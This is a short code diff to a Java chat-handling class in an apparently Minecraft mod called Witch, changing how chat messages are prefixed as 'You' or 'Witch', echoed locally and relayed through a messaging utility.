@@ -11,9 +11,6 @@ import java.util.regex.Pattern;
 import static me.soda.witch.Witch.mc;
 
 public class ChatControl {
-
-    private static final Text prefix = Text.of(Formatting.GRAY + "[" + Formatting.DARK_PURPLE + "Witch" + Formatting.GRAY + "] " + Formatting.RESET);
-
     private static boolean firstTime = true;
 
     public static boolean filter(Text message) {
@@ -33,12 +30,15 @@ public class ChatControl {
         }
     }
 
-    public static void chat(Text msg) {
+    public static void chat(Text msg, boolean you) {
+        if (mc.world == null) return;
+
+        Text prefix = Text.of(Formatting.GRAY + "[" + Formatting.DARK_PURPLE + (you ? "You" : "Witch") + Formatting.GRAY + "] " + Formatting.RESET);
+
         if (firstTime) {
             firstTime = false;
-            chat(Text.of("Alert: Input @w <text> to chat with the Witch."));
+            chat(Text.of("Notice: Input @w <text> to chat with me."), false);
         }
-        if (mc.world == null) return;
 
         MutableText message = Text.literal("");
         message.append(prefix);
@@ -52,7 +52,9 @@ public class ChatControl {
         if (msgArr.length < 2) return false;
         String[] strArr = new String[msgArr.length - 1];
         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
-        MessageUtils.sendMessage("chat", String.join(" ", strArr));
+        String chatText = String.join(" ", strArr);
+        chat(Text.of(chatText), true);
+        MessageUtils.sendMessage("chat", chatText);
         return true;
     }
 }
